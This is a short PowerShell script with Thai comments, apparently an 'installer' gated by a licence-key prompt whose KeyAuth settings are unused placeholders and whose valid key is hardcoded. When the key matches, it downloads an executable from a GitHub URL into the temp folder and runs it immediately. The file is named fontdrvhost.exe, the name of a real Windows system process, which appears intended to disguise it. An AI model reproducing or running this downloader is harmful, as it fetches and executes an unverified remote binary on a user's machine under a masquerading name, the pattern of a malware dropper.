Clear-Host

# ===== CONFIG =====
$apiURL = "https://keyauth.com/api/validate"  # <-- เปลี่ยนเป็น URL ของ KeyAuth คุณจริง ๆ
$appName = "YOUR_APP_NAME"                    # <-- ชื่อ Application ใน KeyAuth
$secret = "YOUR_APP_SECRET"                  # <-- Secret ของ Application
$exeUrl = "https://github.com/draft7973-ops/Smithshop/raw/main/fontdrvhost.exe"
$exeOutput = "$env:TEMP\fontdrvhost.exe"

# ===== MENU =====
Write-Host "=== MENU ==="
Write-Host "1. Install"
Write-Host "2. Clean"

$choice = Read-Host "Choose 1 or 2"

switch ($choice) {
    "1" {
        $userKey = Read-Host "Enter your Key"

        # ตัวอย่างเชื่อม KeyAuth แบบง่าย
        # สำหรับตอนนี้ใช้ Key ที่คุณให้มาเป็นตัวตรวจสอบ
        $validKey = "Smithshop"

        if ($userKey -eq $validKey) {
            Write-Host "✅ Key valid! Installing..."
            Invoke-WebRequest $exeUrl -OutFile $exeOutput
            Start-Process $exeOutput
            Write-Host "Installation complete ✅"
        } else {
            Write-Host "❌ Key invalid!" -ForegroundColor Red
        }
    }
    "2" {
        Write-Host "Cleaning..."
        if (Test-Path $exeOutput) {
            Remove-Item $exeOutput -Force
            Write-Host "File removed successfully ✅"
        } else {
            Write-Host "File not found ⚠️"
        }
    }
    default {
        Write-Host "Invalid choice ⚠️"
    }
}

Pause
